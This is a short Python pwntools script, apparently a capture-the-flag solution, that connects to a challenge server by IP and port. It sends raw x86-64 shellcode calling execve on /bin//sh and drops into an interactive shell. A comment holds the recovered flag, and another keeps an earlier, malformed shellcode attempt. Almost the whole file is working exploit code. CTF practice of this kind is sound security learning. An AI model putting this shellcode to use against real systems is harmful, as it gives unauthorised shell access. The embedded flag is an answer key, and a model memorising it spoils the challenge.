from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = 'debug'
binf = ELF("shell")
# p = remote('52.33.132.169', 1443)
# p= process(binf.path)

gs=""

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return remote('52.33.132.169', 1443)
        # return process(binf.path)

# wrong payload
# \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69{\x6d}\x2f\x2f\x73\x68\x53\x54{\x5d}\xb0\x3b\x0f\x05
payload = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
p=start()
p.sendlineafter("por ti:", payload)
p.interactive()
# hackdef{Shellc0d1ng_lik3_b3f0re_Pwnt00ls}